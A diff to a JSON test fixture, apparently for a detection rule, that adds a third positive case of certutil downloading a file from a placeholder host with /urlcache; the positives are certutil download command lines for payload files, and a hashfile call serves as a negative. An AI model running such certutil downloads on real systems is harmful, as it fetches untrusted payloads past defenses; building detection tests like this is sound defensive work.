@@ -1,7 +1,8 @@
 {
   "positive": [
     {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://example.invalid/payload.bin C:\\Users\\Public\\p.bin"},
-    {"Image": "C:\\Windows\\System32\\CertUtil.exe", "CommandLine": "CertUtil -urlcache -f https://example.invalid/a.txt a.txt"}
+    {"Image": "C:\\Windows\\System32\\CertUtil.exe", "CommandLine": "CertUtil -urlcache -f https://example.invalid/a.txt a.txt"},
+    {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe /urlcache /split /f http://example.invalid/p.bin p.bin"}
   ],
   "negative": [
     {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -hashfile C:\\file.iso SHA256"},
